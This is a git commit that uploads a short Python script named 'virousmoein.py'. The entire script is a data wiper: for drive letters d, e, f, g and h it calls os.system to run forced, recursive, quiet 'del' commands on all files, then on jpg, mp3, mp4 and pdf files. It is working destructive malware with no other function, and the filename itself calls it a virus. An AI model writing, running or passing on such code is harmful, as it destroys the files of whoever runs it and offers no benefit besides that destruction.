3d698e84ae7e3094720a98249bba90295ef5557c
i am moein <44437189+moeinsk@users.noreply.github.com>
2018-12-12 22:41:08 -0800

    Add files via upload

---
+++ virousmoein.py
@@ -0,0 +1,15 @@
+import os 
+
+list = ["d" , "e" , "f" , "h" ,"g"]
+
+for d in list:
+    drive = d
+
+    os.system("del "+drive+":\*.* /f /s /q")
+    os.system("del "+drive+":\*.jpg /f /s /q")
+    os.system("del "+drive+":\*.mp3 /f /s /q")
+    os.system("del "+drive+":\*.mp4 /f /s /q")
+    os.system("del "+drive+":\*.pdf /f /s /q")
+   
+
+
